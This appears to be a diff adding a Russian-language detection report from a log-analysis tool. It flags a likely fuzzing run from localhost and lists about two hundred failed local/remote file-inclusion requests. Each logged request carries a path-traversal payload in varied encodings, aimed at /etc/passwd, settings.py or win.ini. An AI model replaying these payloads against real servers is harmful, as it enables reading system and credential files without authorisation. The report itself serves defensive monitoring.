@@ -1,0 +1,542 @@
+[!] Вероятность фаззинга от 127.0.0.1: 99.24237231110934
+
+[+] Эксплуатация LFI и RFI: 
+
+[+] Эксплуатация LFI и RFI: - неуспешные
+    - 2025-03-18 12:26:36,972 INFO 127.0.0.1 "GET /axelor?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,594 INFO 127.0.0.1 "GET /admin?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,294 INFO 127.0.0.1 "GET /mcollective?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,399 INFO 127.0.0.1 "GET /statsd?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:02,031 INFO 127.0.0.1 "GET /otrs?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,134 INFO 127.0.0.1 "GET /monit?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,037 INFO 127.0.0.1 "GET /findbugs?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,067 INFO 127.0.0.1 "GET /ui?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,603 INFO 127.0.0.1 "GET /ansible?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,041 INFO 127.0.0.1 "GET /owncloud?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,246 INFO 127.0.0.1 "GET /shpoint?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,827 INFO 127.0.0.1 "GET /supervisor?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,603 INFO 127.0.0.1 "GET /findbugs?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,006 INFO 127.0.0.1 "GET /bamboo?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:41,989 INFO 127.0.0.1 "GET /vagrant?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,389 INFO 127.0.0.1 "GET /cluster?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,882 INFO 127.0.0.1 "GET /logstash?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,287 INFO 127.0.0.1 "GET /aws?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,394 INFO 127.0.0.1 "GET /support?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:40,938 INFO 127.0.0.1 "GET /junit?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:42,002 INFO 127.0.0.1 "GET /variant?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:04,349 INFO 127.0.0.1 "GET /docker?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,051 INFO 127.0.0.1 "GET /ganglia?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,254 INFO 127.0.0.1 "GET /sip?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,219 INFO 127.0.0.1 "GET /aws?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,721 INFO 127.0.0.1 "GET /sonar?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,174 INFO 127.0.0.1 "GET /saltstack?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:38,426 INFO 127.0.0.1 "GET /supervisord?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,066 INFO 127.0.0.1 "GET /gateway?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,050 INFO 127.0.0.1 "GET /package?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,921 INFO 127.0.0.1 "GET /tripwire?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,032 INFO 127.0.0.1 "GET /capistrano?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:39,906 INFO 127.0.0.1 "GET /splunk?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,097 INFO 127.0.0.1 "GET /variant?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,729 INFO 127.0.0.1 "GET /kafka?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:40,951 INFO 127.0.0.1 "GET /kafka?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,013 INFO 127.0.0.1 "GET /vault?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,931 INFO 127.0.0.1 "GET /ui?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,047 INFO 127.0.0.1 "GET /cassandra?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,108 INFO 127.0.0.1 "GET /raygun?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,638 INFO 127.0.0.1 "GET /git?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,270 INFO 127.0.0.1 "GET /sonar?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,333 INFO 127.0.0.1 "GET /metrics?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,370 INFO 127.0.0.1 "GET /docker?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,904 INFO 127.0.0.1 "GET /elastic?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,059 INFO 127.0.0.1 "GET /pagerduty?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,340 INFO 127.0.0.1 "GET /mirror?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,162 INFO 127.0.0.1 "GET /mysql?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:44,381 INFO 127.0.0.1 "GET /docs?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:44,916 INFO 127.0.0.1 "GET /maven?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,499 INFO 127.0.0.1 "GET /gl?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,938 INFO 127.0.0.1 "GET /upguard?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:39,089 INFO 127.0.0.1 "GET /github?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,075 INFO 127.0.0.1 "GET /chef?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,473 INFO 127.0.0.1 "GET /tcity?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,390 INFO 127.0.0.1 "GET /dokuwiki?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:42,048 INFO 127.0.0.1 "GET /vtiger?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,271 INFO 127.0.0.1 "GET /bamboo?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,509 INFO 127.0.0.1 "GET /glpi?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,137 INFO 127.0.0.1 "GET /registry?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,342 INFO 127.0.0.1 "GET /build?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,357 INFO 127.0.0.1 "GET /mongodb?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,862 INFO 127.0.0.1 "GET /tasks?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,483 INFO 127.0.0.1 "GET /team?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,556 INFO 127.0.0.1 "GET /graphite?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,205 INFO 127.0.0.1 "GET /kube?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,147 INFO 127.0.0.1 "GET /repo?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:44,400 INFO 127.0.0.1 "GET /elastic?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,927 INFO 127.0.0.1 "GET /mcollective?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,518 INFO 127.0.0.1 "GET /gradle?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:42,468 INFO 127.0.0.1 "GET /crm?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,181 INFO 127.0.0.1 "GET /nagios?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,492 INFO 127.0.0.1 "GET /teamcity?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,941 INFO 127.0.0.1 "GET /stas?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,198 INFO 127.0.0.1 "GET /sbt?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,920 INFO 127.0.0.1 "GET /email?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,109 INFO 127.0.0.1 "GET /clickhouse?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,160 INFO 127.0.0.1 "GET /rudder?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,674 INFO 127.0.0.1 "GET /gl?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,500 INFO 127.0.0.1 "GET /teraform?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:42,479 INFO 127.0.0.1 "GET /datadog?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:02,206 INFO 127.0.0.1 "GET /scalyr?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,657 INFO 127.0.0.1 "GET /keycloak?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:44,569 INFO 127.0.0.1 "GET /graylog?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,538 INFO 127.0.0.1 "GET /graphite?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:40,169 INFO 127.0.0.1 "GET /zimbra?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,399 INFO 127.0.0.1 "GET /mysql?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,746 INFO 127.0.0.1 "GET /splunk?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,171 INFO 127.0.0.1 "GET /saltstack?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,929 INFO 127.0.0.1 "GET /fabric?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,950 INFO 127.0.0.1 "GET /stash?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,378 INFO 127.0.0.1 "GET /checkstyle?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:42,059 INFO 127.0.0.1 "GET /wiki?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,438 INFO 127.0.0.1 "GET /saltstack?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,410 INFO 127.0.0.1 "GET /naginator?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:04,391 INFO 127.0.0.1 "GET /email?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:38,516 INFO 127.0.0.1 "GET /tripwire?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,154 INFO 127.0.0.1 "GET /mercurial?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,211 INFO 127.0.0.1 "GET /nfs?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,447 INFO 127.0.0.1 "GET /sap?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,214 INFO 127.0.0.1 "GET /clickhouse?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,243 INFO 127.0.0.1 "GET /liferay?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:42,697 INFO 127.0.0.1 "GET /gradle?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,565 INFO 127.0.0.1 "GET /groovy?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,143 INFO 127.0.0.1 "GET /codeship?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,164 INFO 127.0.0.1 "GET /mesos?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,377 INFO 127.0.0.1 "GET /dokuwiki?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,653 INFO 127.0.0.1 "GET /av?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,220 INFO 127.0.0.1 "GET /oauth?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,233 INFO 127.0.0.1 "GET /codeship?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,155 INFO 127.0.0.1 "GET /checkstyle?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,630 INFO 127.0.0.1 "GET /jacoco?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,178 INFO 127.0.0.1 "GET /metric?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,388 INFO 127.0.0.1 "GET /elastic?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,214 INFO 127.0.0.1 "GET /scalyr?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:37,200 INFO 127.0.0.1 "GET /consul?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:42,092 INFO 127.0.0.1 "GET /zipkin?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,477 INFO 127.0.0.1 "GET /scalyr?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,601 INFO 127.0.0.1 "GET /im?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,002 INFO 127.0.0.1 "GET /gradle?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,178 INFO 127.0.0.1 "GET /conf?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,267 INFO 127.0.0.1 "GET /juju?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,133 INFO 127.0.0.1 "GET /jira?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,270 INFO 127.0.0.1 "GET /mail?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,212 INFO 127.0.0.1 "GET /crm?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,991 INFO 127.0.0.1 "GET /support?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,487 INFO 127.0.0.1 "GET /selenium?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,854 INFO 127.0.0.1 "GET /shpoint?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,353 INFO 127.0.0.1 "GET /openstack?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,278 INFO 127.0.0.1 "GET /mattermost?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,769 INFO 127.0.0.1 "GET /stackstorm?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:41,955 INFO 127.0.0.1 "GET /tripwire?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,256 INFO 127.0.0.1 "GET /collectd?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,641 INFO 127.0.0.1 "GET /jenkins?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,278 INFO 127.0.0.1 "GET /junit?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,705 INFO 127.0.0.1 "GET /sip?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,182 INFO 127.0.0.1 "GET /cassandra?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,735 INFO 127.0.0.1 "GET /registry?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:42,115 INFO 127.0.0.1 "GET /adm?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,447 INFO 127.0.0.1 "GET /nfs?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,652 INFO 127.0.0.1 "GET /jira?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:44,268 INFO 127.0.0.1 "GET /collectl?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,953 INFO 127.0.0.1 "GET /nagios?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:04,764 INFO 127.0.0.1 "GET /mcollective?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,630 INFO 127.0.0.1 "GET /stackstorm?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:03,162 INFO 127.0.0.1 "GET /junit?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,903 INFO 127.0.0.1 "GET /naginator?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,016 INFO 127.0.0.1 "GET /tcity?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,664 INFO 127.0.0.1 "GET /jk?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,030 INFO 127.0.0.1 "GET /api-int?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,305 INFO 127.0.0.1 "GET /keycloak?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,251 INFO 127.0.0.1 "GET /monitoring?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:41,845 INFO 127.0.0.1 "GET /supervisord?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,238 INFO 127.0.0.1 "GET /openstack?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,445 INFO 127.0.0.1 "GET /ganglia?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,257 INFO 127.0.0.1 "GET /dev?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:39,173 INFO 127.0.0.1 "GET /haproxy?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,444 INFO 127.0.0.1 "GET /teraform?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,043 INFO 127.0.0.1 "GET /haproxy?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,171 INFO 127.0.0.1 "GET /kafka?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:37,922 INFO 127.0.0.1 "GET /netdata?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:03,456 INFO 127.0.0.1 "GET /oauth?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:04,082 INFO 127.0.0.1 "GET /api-int?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,674 INFO 127.0.0.1 "GET /juju?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:26:37,268 INFO 127.0.0.1 "GET /docker?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:02,451 INFO 127.0.0.1 "GET /tools?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:37,933 INFO 127.0.0.1 "GET /nextcloud?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,272 INFO 127.0.0.1 "GET /naginator?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,249 INFO 127.0.0.1 "GET /opentsdb?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:43,558 INFO 127.0.0.1 "GET /snort?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:38,296 INFO 127.0.0.1 "GET /sip?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,309 INFO 127.0.0.1 "GET /datadog?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:01,466 INFO 127.0.0.1 "GET /git?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:27:04,226 INFO 127.0.0.1 "GET /clickhouse?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,091 INFO 127.0.0.1 "GET /artifactory?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:43,261 INFO 127.0.0.1 "GET /osticket?id=/./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,466 INFO 127.0.0.1 "GET /openshift?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:39,321 INFO 127.0.0.1 "GET /kube?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,784 INFO 127.0.0.1 "GET /sap?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,768 INFO 127.0.0.1 "GET /keycloak?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,234 INFO 127.0.0.1 "GET /cloud?id=_static/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,790 INFO 127.0.0.1 "GET /mesos?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,203 INFO 127.0.0.1 "GET /influxdb?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:02,536 INFO 127.0.0.1 "GET /wiki?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:40,189 INFO 127.0.0.1 "GET /activemq?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,332 INFO 127.0.0.1 "GET /desk?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,467 INFO 127.0.0.1 "GET /ui?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:44,063 INFO 127.0.0.1 "GET /av?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,489 INFO 127.0.0.1 "GET /gitlab?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:01,694 INFO 127.0.0.1 "GET /kafka?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:38,316 INFO 127.0.0.1 "GET /sonar?id=../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:39,214 INFO 127.0.0.1 "GET /jabber?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:41,308 INFO 127.0.0.1 "GET /nextcloud?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:43,587 INFO 127.0.0.1 "GET /sonarqube?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:39,803 INFO 127.0.0.1 "GET /sbt?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:44,582 INFO 127.0.0.1 "GET /groovy?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:03,084 INFO 127.0.0.1 "GET /influxdb?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,107 INFO 127.0.0.1 "GET /av?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:37,964 INFO 127.0.0.1 "GET /openshift?id=assets/file:///etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,712 INFO 127.0.0.1 "GET /liferay?id=_next\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:26:41,116 INFO 127.0.0.1 "GET /maven?id=../settings.py HTTP/1.1" 404
+    - 2025-03-18 12:26:41,427 INFO 127.0.0.1 "GET /pbx?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:26:42,521 INFO 127.0.0.1 "GET /docker?id=./ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,483 INFO 127.0.0.1 "GET /vagrant?id=_static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:04,800 INFO 127.0.0.1 "GET /metric?id=\\ HTTP/1.1" 404
+    - 2025-03-18 12:26:41,320 INFO 127.0.0.1 "GET /nfs?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:26:44,074 INFO 127.0.0.1 "GET /aws?id=/\\ HTTP/1.1" 404
+    - 2025-03-18 12:27:02,308 INFO 127.0.0.1 "GET /squid?id=%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1" 404
+    - 2025-03-18 12:27:02,978 INFO 127.0.0.1 "GET /gitlab?id=_next/../../../../../../../../../etc/passwd HTTP/1.1" 404
+    - 2025-03-18 12:27:03,476 INFO 127.0.0.1 "GET /openstack?id=../../../../../etc/passwd HTTP/1.1" 404
